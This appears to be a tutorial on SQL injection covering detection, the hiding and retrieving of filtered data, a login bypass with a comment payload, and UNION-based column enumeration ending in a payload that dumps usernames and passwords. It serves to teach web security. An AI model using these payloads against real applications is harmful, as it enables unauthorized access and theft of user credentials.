SQL injections are web attacks that are used performed by attackers to manipulate and interfere with queries that are sent to the database server. This attack allows a threat actor to view data that they are not able to view normally.

### Detecting SQL injection vulnerabilities.
#### Automated
Burp suite's vulnerability scanner can automate the discovery of SQL injection vulnerabilities.
#### Manually
1. Submitting the `' ` character and looking for errors and other anomalies.
2. Submitting boolean conditions such  as `OR 1=1` and looking for differences in application responses.
3. Submitting payloads desgined to trigger time delays when executed within a SQL query and looking for differences in the time taken to respond.

### Retrieving hidden data
Take an example of an ecommerce site that only shows you products that have been is available for sale and hides what is not available for sale. This application may make the following query to the database

```sql
SELECT * FROM PRODUCTS WHERE CATEGORY = 'Shoes' AND avalialble = 1;
```

The restriction 1 is used to hide products that are not available which means that unavailable products may be tagged as 0.

On the browser, the developer may present this in the url as

```url
https://website.com/products?category=Shoes
```

This gives an attacker the ability to create an attack like

```url
https://website.com/products?category=Shoes'--
```

This URL comments will make the SQL query look as follows

```sql
SELECT * FROM products WHERE category = 'Shoes'--' AND available =1
```

This attack removes the other part of the SQL statement and shows all the shoes that are available on the site. Alternatively, the attacker might add a different payload which has the same impact.

```url
https://website.com/products?category=Shoes'+OR+1=1--
```

This might result to the query below

```sql
SELECT * FROM products WHERE category = 'Shoes' OR 1=1--' AND available - 1
```

This query returns all query will return all items where either the category of Shoes, or 1 is equal to 1 since 1 is always true.

### Subverting application logic.

In an application where one has to login with a username and password when a user submits a username and password, the application does a check by running the below SQL query

```sql
SELECT * FROM users WHERE username = '<username>' AND password = '<password>'
```

We can login as any user by simply adding a `'--` to our username which will comment the rest of the SQL statement and make it look like the following

```sql
SELECT * FROM users WHERE username = 'kiiru4reals'--' AND password = ''
```

### Union-based SQL injection
In situations where the results of a SQL query are returned within the application's responses, an attacker can leverage the `UNION` keyword to retrieve data from other tables within the database..

The `UNION` keyword allows one to execute more than one query and append results to the original query.

```sql
SELECT column_1, column_2 FROM table_x UNION SELECT column_3, column_4 FROM table_y
```

For this query to work we need to ensure that;
1. Individual queries must return the same number of columns.
2. The data types in each column must be compatible between the individual queries.

To successfully perform a SQL injection UNION attack we need to assess the following criteria:
1. How many columns are returned from the original query?
2. Which columns returned from the original query are of a suitable data type to hold the results from the injected query?
We have a site that has a category filter that is vulnerable to UNION based SQL injection, we can determine the number of columns that are being called by a query by using either `ORDER BY` or `UNION SELECT` 

An example can be as follows:

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
This goes on and on and on a SQL related error will be provided when the number of NULLs are equal to the number of columns.

The `ORDER BY` attack is used as follows:

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

#### Finding columns with useful data types
To discover columns that have a useful data which is more often than not in string form, we need to find a column that is compatible with string data. Once we determine the number of columns that are required, we can test whether a column holds string data by using `UNION SELECT` payloads that place a string value into each column.

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

If the datatype of a column is not compatible with string data, the injected query will cause a database error. If there is no error, the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.
#### Using a SQL injection UNION attack to retrieve interesting data
Once we have discovered columns that are suitable for us to retrieve data (in this case string data) we can go ahead and retrieve data. To ensure that this attack is successful we need to ensure that:
1. The original query returns the exact number of columns that you want (so if you want to get two columns we need to look for a query that retrieves two columns)
2. The place of injection should be between the `WHERE` clause.
3. The table you want to retrieve from and the columns exist.

For example, we can dump contents from the `users` table by running the following command

```sql
' UNION SELECT username, password FROM users--
```

### Cheatsheet

The SQL injection cheatsheet can be found [here](https://portswigger.net/web-security/sql-injection/cheat-sheet) 